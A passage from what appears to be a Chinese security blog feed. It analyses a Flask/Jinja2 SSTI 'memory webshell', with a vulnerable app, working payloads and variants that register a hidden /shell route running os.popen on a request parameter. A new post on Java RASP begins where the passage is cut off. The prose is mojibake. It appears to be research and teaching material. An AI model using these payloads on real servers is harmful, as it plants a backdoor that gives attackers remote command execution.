request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>flaskç‰ˆæœ¬ä¸º2.0.3ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d2714f1ddac507cc0dc856.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2714f1ddac507cc0dc856.jpg"></a></p><h3 id="æ³¨å…¥æµç¨‹åˆ†æ"><a href="#æ³¨å…¥æµç¨‹åˆ†æ" class="headerlink" title="æ³¨å…¥æµç¨‹åˆ†æ"></a>æ³¨å…¥æµç¨‹åˆ†æ</h3><p>é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹payload ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>url_foræ˜¯Flaskçš„ä¸€ä¸ªå†…ç½®å‡½æ•°, é€šè¿‡Flaskå†…ç½®å‡½æ•°å¯ä»¥è°ƒç”¨å…¶<code>__globals__</code>å±æ€§, è¯¥ç‰¹æ®Šå±æ€§èƒ½å¤Ÿè¿”å›å‡½æ•°æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡, å…¶ä¸­åŒ…å«äº†å¾ˆå¤šå·²ç»å¼•å…¥çš„modulesï¼Œæ¯”å¦‚<code>__builtins__</code>æ¨¡å—ã€‚åœ¨<code>__builtins__</code>æ¨¡å—ä¸­, <code>Python</code>åœ¨å¯åŠ¨æ—¶å°±ç›´æ¥ä¸ºæˆ‘ä»¬å¯¼å…¥äº†å¾ˆå¤šå†…å»ºå‡½æ•°ï¼Œå¦‚evalï¼Œexecç­‰ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹pythonä¸­evalå‡½æ•°æ˜¯æ€æ ·ä½¿ç”¨çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d271011ddac507cc0d09d9.jpg" title="image-20230808234956583" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271011ddac507cc0d09d9.jpg" alt="image-20230808234956583"></a></p><p>ç»™å‡ºä»¥ä¸‹ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namespace = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&quot;a + b&quot;</span>, namespace)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œevalå‡½æ•°æ˜¯åœ¨æŒ‡å®šå‘½åç©ºé—´ä¸­æ‰§è¡Œè¡¨è¾¾å¼ï¼Œa+bå³2+3ã€‚</p><p>é‚£åœ¨ç»™å‡ºçš„payloadä¸­ï¼Œä»¥ä¸‹ä¸ºè¡¨è¾¾å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">    <span class="string">&#x27;/shell&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>, </span><br><span class="line">    <span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)).read()</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹ä»£ç å³æ˜¯æˆ‘ä»¬åˆ¶å®šçš„å‘½åç©ºé—´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>current_app</code>æ˜¯ä¸€ä¸ªæœ¬åœ°ä»£ç†ï¼Œå®ƒçš„ç±»å‹æ˜¯<code>werkzeug.local.LocalProxy</code>ï¼Œå®ƒæ‰€ä»£ç†çš„å³æ˜¯æˆ‘ä»¬çš„<code>app</code>å¯¹è±¡ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d2710e1ddac507cc0d283f.jpg" title="image-20230808185151749" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2710e1ddac507cc0d283f.jpg" alt="image-20230808185151749"></a></p><p>åªåœ¨è¯·æ±‚çº¿ç¨‹å†…å­˜åœ¨ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸå°±æ˜¯åœ¨åº”ç”¨ä¸Šä¸‹æ–‡é‡Œã€‚ç¦»å¼€äº†åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œ<code>current_app</code>ä¸€æ ·æ— æ³•ä½¿ç”¨ã€‚</p><p>å½“ä¸€ä¸ªç½‘é¡µè¯·æ±‚æ¥ä»¥åï¼ŒFlaskä¼šå®ä¾‹åŒ–å¯¹è±¡appï¼Œæ‰§è¡Œ<code>__call__</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d271191ddac507cc0d41f8.jpg" title="image-20230808222142861" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271191ddac507cc0d41f8.jpg" alt="image-20230808222142861"></a></p><p>ä¹‹åè°ƒç”¨<code>flask.app.Flask.wsgi_app</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d271641ddac507cc0df993.jpg" title="image-20230808223208880" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271641ddac507cc0df993.jpg" alt="image-20230808223208880"></a></p><p>æ­¤å¤„è°ƒç”¨äº†<code>flask.app.Flask.request_context</code>åˆ›å»ºä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡<code>RequestContext</code>ç±»å‹çš„å¯¹è±¡ï¼Œï¼š</p><p><a href="https://pic.imgdb.cn/item/64d2716e1ddac507cc0e17a9.jpg" title="image-20230808223251476" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2716e1ddac507cc0e17a9.jpg" alt="image-20230808223251476"></a></p><p>å…¶éœ€æ¥æ”¶<code>werkzeug</code>ä¸­çš„<code>environ</code>å¯¹è±¡ä¸ºå‚æ•°ã€‚<code>werkzeug</code>æ˜¯Flaskæ‰€ä¾èµ–çš„WSGIå‡½æ•°åº“ã€‚æ¥ä¸‹æ¥åˆè°ƒç”¨äº†push()æ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d271771ddac507cc0e2f93.jpg" title="image-20230808223402158" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271771ddac507cc0e2f93.jpg" alt="image-20230808223402158"></a></p><p>è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ<code>request_context</code>æ–¹æ³•å·²ç»åˆ›å»ºäº†è¯·æ±‚ä¸Šä¸‹æ–‡ï¼Œä¸ºä»€ä¹ˆè¿˜è¦è°ƒç”¨<code>push</code>å’Œ<code>pop</code>æ–¹æ³•å‘¢ï¼Ÿè¿™å°±æ˜¯Flaskå…³äºä¸Šä¸‹æ–‡å®ç°çš„å…³é”®äº†ã€‚å¯¹äºFlask Webåº”ç”¨æ¥è¯´ï¼Œæ¯ä¸ªè¯·æ±‚å°±æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„çº¿ç¨‹ã€‚è¯·æ±‚ä¹‹é—´çš„ä¿¡æ¯è¦å®Œå…¨éš”ç¦»ï¼Œé¿å…å†²çªï¼Œè¿™å°±éœ€è¦ä½¿ç”¨æœ¬åœ°çº¿ç¨‹ç¯å¢ƒ(ThreadLocal)ï¼Œè¿™ä¸ªæ¦‚å¿µåœ¨å…¶ä»–è¯­è¨€å¦‚Javaä¸­ä¹Ÿæœ‰ã€‚<code>ctx.push()</code>æ–¹æ³•ï¼Œä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ï¼Œå‹å…¥<code>flask._request_ctx_stack</code>çš„æ ˆä¸­ï¼Œè¿™ä¸ª<code>_request_ctx_stack</code>æ˜¯å†…éƒ¨å¯¹è±¡ã€‚åŒæ—¶è¿™ä¸ª<code>_request_ctx_stack</code>æ ˆæ˜¯ä¸ªThreadLocalå¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯<code>flask._request_ctx_stack</code>çœ‹ä¼¼å…¨å±€å¯¹è±¡ï¼Œå…¶å®æ¯ä¸ªçº¿ç¨‹çš„éƒ½ä¸ä¸€æ ·ã€‚è¯·æ±‚ä¸Šä¸‹æ–‡å‹å…¥æ ˆåï¼Œå†æ¬¡è®¿é—®å…¶éƒ½ä¼šä»è¿™ä¸ªæ ˆçš„é¡¶ç«¯é€šè¿‡<code>_request_ctx_stack.top</code>æ¥è·å–ï¼Œæ‰€ä»¥å–åˆ°çš„æ°¸è¿œæ˜¯åªå±äºæœ¬çº¿ç¨‹ä¸­çš„å¯¹è±¡ï¼Œè¿™æ ·ä¸åŒè¯·æ±‚ä¹‹é—´çš„ä¸Šä¸‹æ–‡å°±åšåˆ°äº†å®Œå…¨éš”ç¦»ã€‚è¯·æ±‚ç»“æŸåï¼Œçº¿ç¨‹é€€å‡ºï¼ŒThreadLocalçº¿ç¨‹æœ¬åœ°å˜é‡ä¹Ÿéšå³é”€æ¯ï¼Œ<code>ctx.pop()</code>ç”¨æ¥å°†è¯·æ±‚ä¸Šä¸‹æ–‡ä»æ ˆé‡Œå¼¹å‡ºï¼Œé¿å…å†…å­˜æ— æ³•å›æ”¶ã€‚</p><p>çŸ¥é“äº†appå’Œ_request_ctx_stackæ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬å°±æ¥çœ‹çœ‹evalä¸­çš„è¡¨è¾¾å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">    <span class="string">&#x27;/shell&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>, </span><br><span class="line">    <span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)).read()</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›è£…é¥°å™¨<code>@app.route(&#39;&lt;url&gt;&#39;)</code>çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å…¶æœ¬è´¨ä¸Šä¹Ÿè°ƒç”¨äº†flaskå¯¹è±¡çš„add_url_rule()æ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d271871ddac507cc0e53d3.jpg" title="image-20230808224327817" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271871ddac507cc0e53d3.jpg" alt="image-20230808224327817"></a></p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä¸ä½¿ç”¨è£…é¥°å™¨åˆ›å»ºè·¯ç”±çš„ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/index&#x27;</span>,endpoint=<span class="string">&#x27;index&#x27;</span>,view_func=index)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯è¿™ä¸‰ä¸ªå‚æ•°çš„è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">:param rule: The URL rule string.</span><br><span class="line">:param endpoint: The endpoint name to associate with the rule</span><br><span class="line">    and view function. Used when routing and building URLs.</span><br><span class="line">    Defaults to ``view_func.__name__``.</span><br><span class="line">:param view_func: The view function to associate with the</span><br><span class="line">    endpoint name.</span><br></pre></td></tr></table></figure><p>å› æ­¤payloadä¸­add_url_rule()æ–¹æ³•çš„æ¯ä¸€ä¸ªå‚æ•°çš„æ„æ€ä¹Ÿå°±çŸ¥é“äº†ï¼Œä¸»è¦çœ‹payloadä¸­çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br></pre></td></tr></table></figure><p>é€šè¿‡<strong>import</strong>æ¨¡å—å¯¼å…¥oså¹¶æ‰§è¡Œos.popen(cmd).read()ã€‚<code>_request_ctx_stack.top</code>æ‹¿åˆ°<code>_request_ctx_stack</code>çš„æ ˆé¡¶å…ƒç´ ï¼Œå³å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ï¼Œä¹‹åä»å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡è·å–requestå¯¹è±¡ï¼Œé€šè¿‡request.args.get()çš„æ–¹æ³•æ‹¿åˆ°cmdå‚æ•°çš„å€¼ï¼Œå¦‚æœcmdå‚æ•°ä¸ºç©ºï¼Œå°±è®¾ä¸ºwhoamiã€‚ä¹Ÿå°±æ˜¯è¯´é»˜è®¤æ‰§è¡Œwhoamiã€‚</p><h3 id="payloadå˜å½¢"><a href="#payloadå˜å½¢" class="headerlink" title="payloadå˜å½¢"></a>payloadå˜å½¢</h3><p>è‡³æ­¤ï¼Œæ•´ä¸ªpayloadçš„è„‰ç»œä¹Ÿæ¢³ç†æ¸…æ¥šäº†ã€‚é‚£ä»”ç»†æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆåŠæ³•å¯¹è¿™ä¸ªpayloadè¿›è¡Œä¸€äº›æ”¹å˜å‘¢ï¼Ÿä»¥requestå¯¹è±¡ä¸ºä¾‹ï¼Œåˆšåˆšæåˆ°ï¼Œåœ¨payloadä¸­ï¼Œè·å–requestå¯¹è±¡æ˜¯é€šè¿‡ä»å…¨å±€å˜é‡ä¸­è·å–_request_ctx_stackï¼Œå¹¶è·å–å®ƒçš„æ ˆé¡¶å…ƒç´ åŠè¯·æ±‚ä¸Šä¸‹æ–‡ï¼Œè€Œè¯·æ±‚ä¸Šä¸‹æ–‡çš„requestå±æ€§å³æ˜¯æˆ‘ä»¬çš„éœ€è¦çš„requestå¯¹è±¡ã€‚ä½†åœ¨æˆ‘ä»¬å…¶å®å¯ä»¥åœ¨<code>url_for.__globals__</code>å°±æ‰¾åˆ°æ­¤æ¬¡è¯·æ±‚çš„requestå¯¹è±¡ï¼Œè€Œä¸ç”¨é€šè¿‡è¿™ç§æ–¹å¼æ¥è·å–ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d271941ddac507cc0e727e.jpg" title="image-20230808235310632" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271941ddac507cc0e727e.jpg" alt="image-20230808235310632"></a></p><p>å› æ­¤payloadå¯ä»¥æ”¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯æ‰§è¡Œç»“æœï¼š</p><p><a href="https://pic.imgdb.cn/item/64d2719f1ddac507cc0e8cf0.jpg" title="image-20230809000443773" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2719f1ddac507cc0e8cf0.jpg" alt="image-20230809000443773"></a></p><p>é‚£å½“å‰appå¯¹è±¡è¿˜èƒ½ä»å“ªé‡Œè·å–å‘¢ï¼Ÿå¯ä»¥ä»_app_ctx_stackçš„æ ˆé¡¶å…ƒç´ ä¸­è·å–åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œåœ¨åº”ç”¨ä¸Šä¸‹æ–‡ä¸­æœ‰appå±æ€§ï¼Œå³æ˜¯æˆ‘ä»¬éœ€è¦çš„appå¯¹è±¡ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d271b01ddac507cc0eb2f5.jpg" title="image-20230808235717822" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271b01ddac507cc0eb2f5.jpg" alt="image-20230808235717822"></a></p><p>å› æ­¤payloadå¯ä»¥æ”¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;_app_ctx_stack&#x27;].top.app&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¹Ÿå¯ä»¥è·å¾—å½“å‰çš„appå¯¹è±¡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_flashed_messages.__globals__[&#x27;current_app&#x27;]</span><br></pre></td></tr></table></figure><p>è·å–å½“å‰çš„requestå¯¹è±¡å’Œappå¯¹è±¡ä¸€å®šä¸åªæ˜¯è¿™å‡ ç§æ–¹å¼ï¼Œå¤§å®¶å¯ä»¥ç»§ç»­è¡¥å……ã€‚</p><h3 id="æŸ¥æ€ä¸æ£€æµ‹"><a href="#æŸ¥æ€ä¸æ£€æµ‹" class="headerlink" title="æŸ¥æ€ä¸æ£€æµ‹"></a>æŸ¥æ€ä¸æ£€æµ‹</h3><p>flask&#x2F;jinja2 SSTIæ¼æ´åœ¨å®é™…æ”»é˜²åœºæ™¯å…¶å®å¹¶ä¸å¸¸è§ï¼Œå› æ­¤ä¸ªäººè®¤ä¸ºè¿™ç§å†…å­˜é©¬åªè¦æ³¨æ„ä¸è¦å‡ºç°SSTIæ¼æ´å°±å¯ä»¥äº†ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å› ä¸ºç›®å‰åœ¨å®ä¹ çš„åŸå› ï¼Œä¸åƒä»¥å‰ä¸€æ ·æœ‰å¾ˆå¤šæ—¶é—´ï¼Œè¿™ç¯‡æ–‡ç« æ–­æ–­ç»­ç»­å†™äº†ä¸€å‘¨ï¼Œæœ¬ä»¥ä¸ºç”¨ä¸äº†è¿™ä¹ˆé•¿æ—¶é—´ã€‚ä»¥å‰è§‰å¾—å†…å­˜é©¬ç›¸å…³å†…å®¹çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œå³ä½¿ç›®å‰å†™äº†è¿‡ä¸‡å­—ä¹Ÿæ„Ÿè§‰æœ‰å¾ˆå¤šçš„åœ°æ–¹æœ‰å¾…è¡¥å……ï¼Œæ¯”å¦‚Javaå†…å­˜é©¬çš„ç§ç±»è¿˜å·®å¾ˆå¤šç§ï¼Œä»¥åŠè¿™äº›å†…å­˜é©¬çš„æŸ¥æ€æ–¹å¼ï¼Œå…³äºæŸ¥æ€æ–¹å¼ç›®å‰ä¹Ÿåªæ˜¯å†™äº†Tomcat-Servletå†…å­˜é©¬çš„ æŸ¥æ€æ–¹å¼ã€‚ç¼ºå¤±çš„è¿™äº›æœ‰ç©ºå†å†™å§ï¼Œæ²¡åŠæ³•ï¼Œè¿™å°±æ˜¯æ‡’ç‹—çš„æ—¥å¸¸ï¼Œå˜»å˜»ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://tttang.com/archive/1775">https://tttang.com/archive/1775</a></p><p><a href="https://xz.aliyun.com/t/11566">https://xz.aliyun.com/t/11566</a></p><p><a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p><p><a href="https://github.com/iceyhexman/flask_memory_shell">https://github.com/iceyhexman/flask_memory_shell</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºJava RASPçš„ä¸€äº›ç ”ç©¶</title>
      <link href="/2023/08/06/JavaRASP/"/>
      <url>/2023/08/06/JavaRASP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åˆ†æäº†ç™¾åº¦å¼€æºçš„OpenRASPè¿™æ¬¾RASPäº§å“çš„å¯åŠ¨æµç¨‹åŠHookæµç¨‹ï¼ˆJava RASPéƒ¨åˆ†ï¼‰ï¼Œæ„Ÿè§‰è‡ªå·±å¯¹äºRASPäº§å“æœ‰äº†æ›´æ·±çš„ç†è§£ã€‚æœ¬ç¯‡æ–‡ç« å°†ä¼šä»¥OpenRASPä¸ºä¾‹ï¼Œä»‹ç»RASPäº§å“çš„éƒ¨ç½²ã€æ£€æµ‹åŸç†åŠbypassæ–¹æ³•ï¼Œå¹¶å°è¯•è‡ªå·±å®Œæˆä¸€ä¸ªRASPçš„ç®€å•å®ç°â€”â€”å–åä¸ºCloseRASPã€‚å› ä¸ºç¬”è€…æ°´å¹³æœ‰é™ï¼Œå› æ­¤è¿™ç¯‡æ–‡ç« å¯èƒ½å¹²è´§ä¸å¤šï¼Œå¦‚æœ‰é”™è¯¯æˆ–ä¸è¶³ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬æ–§æ­£ã€‚</p><h2 id="RASPä»‹ç»"><a href="#RASPä»‹ç»" class="headerlink" title="RASPä»‹ç»"></a>RASPä»‹ç»</h2><p>ä»‹ç»RASPä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹ä»€ä¹ˆæ˜¯WAFï¼Ÿ</p><blockquote><p>WAFï¼ˆWeb åº”ç”¨ç¨‹åºé˜²ç«å¢™ï¼‰é€šè¿‡è¿‡æ»¤å’Œç›‘æ§ Web åº”ç”¨ç¨‹åºä¸äº’è”ç½‘ä¹‹é—´çš„ HTTP æµé‡æ¥å¸®åŠ©ä¿æŠ¤ Web åº”ç”¨ç¨‹åºã€‚å®ƒé€šå¸¸å¯ä»¥ä¿æŠ¤ Web åº”ç”¨ç¨‹åºï¼Œä½¿å…¶å…å—è·¨ç«™ç‚¹ä¼ªé€ ã€è·¨ç«™ç‚¹è„šæœ¬ (XSS)ã€æ–‡ä»¶åŒ…å«ã€SQL æ³¨å…¥åŠå…¶ä»–ä¸€äº›æ”»å‡»çš„å½±å“ã€‚</p></blockquote><p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬åœ¨è¿›è¡Œæ”»å‡»æ—¶é‡åˆ°çš„éƒ½æ˜¯åŸºäºæµé‡è§„åˆ™å¯¹æ”»å‡»è¡Œä¸ºè¿›è¡Œè¿‡æ»¤çš„WAFï¼ŒWAFç›¸æ¯”RASPè¯¯æŠ¥ç‡é«˜ï¼Œç»•è¿‡ç‡é«˜ï¼Œä¸”å¸‚é¢ä¸Šä¹Ÿæœ‰å¾ˆå¤šé’ˆå¯¹ä¸åŒwafçš„ç»•è¿‡æ–¹å¼ã€‚è€ŒRASPæ˜¯ä¸€ç§è¿è¡Œæ—¶åº”ç”¨ç¨‹åºè‡ªæˆ‘ä¿æŠ¤çš„æŠ€æœ¯ï¼Œå…¨ç§°â€œRuntime application self-protectionâ€ã€‚å®ƒæ˜¯é€šè¿‡JavaAgentåˆ©ç”¨Instrumentationåœ¨æŒ‡å®šçš„classåŠ è½½ä¹‹åï¼Œè°ƒç”¨æŒ‡å®šçš„ClassFileTransformerå®ç°ç±»çš„transformæ–¹æ³•ï¼Œé€šè¿‡ä½¿ç”¨ASMï¼ˆæˆ–è€…å…¶ä»–å­—èŠ‚ç ä¿®æ”¹æ¡†æ¶ï¼‰æŠ€æœ¯æ¥hookç›®æ ‡classçš„methodï¼Œåœ¨æ–¹æ³•çš„å¼€å¤´æˆ–ç»“å°¾æ’å…¥æ£€æµ‹æ”»å‡»çš„ä»£ç ï¼Œä¹‹åå°†hookå¥½çš„å­—èŠ‚ç è¿”å›ç»™transformerä»è€ŒåŠ è½½åˆ°JVMä¸­ã€‚å› æ­¤å¯ä»¥è¯´JavaAgentå°±æ˜¯Java RASPæŠ€æœ¯çš„åŸºç¡€ã€‚ï¼ˆå»ºè®®è¯»è€…å…ˆäº†è§£JavaAgentåŠJavassistå†é˜…è¯»æœ¬æ–‡ï¼‰</p><h2 id="OpenRASPç ”ç©¶"><a href="#OpenRASPç ”ç©¶" class="headerlink" title="OpenRASPç ”ç©¶"></a>OpenRASPç ”ç©¶</h2><p>OpenRASP æŠ›å¼ƒäº†ä¼ ç»Ÿé˜²ç«å¢™ä¾èµ–è¯·æ±‚ç‰¹å¾æ£€æµ‹æ”»å‡»çš„æ¨¡å¼ï¼Œåˆ›é€ 